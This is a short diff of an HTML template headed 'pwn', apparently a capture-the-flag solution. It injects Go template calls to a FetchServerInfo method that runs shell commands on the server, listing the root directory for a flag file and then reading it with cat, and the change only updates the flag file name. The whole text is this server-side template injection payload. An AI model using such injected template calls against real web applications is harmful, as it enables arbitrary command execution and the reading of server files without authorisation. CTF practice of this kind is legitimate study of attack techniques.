@@ -7,6 +7,6 @@
 <body>
 <h1>pwn</h1>
 {{ .FetchServerInfo "ls / | grep flag" }} <br>
-{{ .FetchServerInfo "cat /flagab80e0f7a9.txt" }}
+{{ .FetchServerInfo "cat /flagb7e3fccbe7.txt" }}
 </body>
 </html>
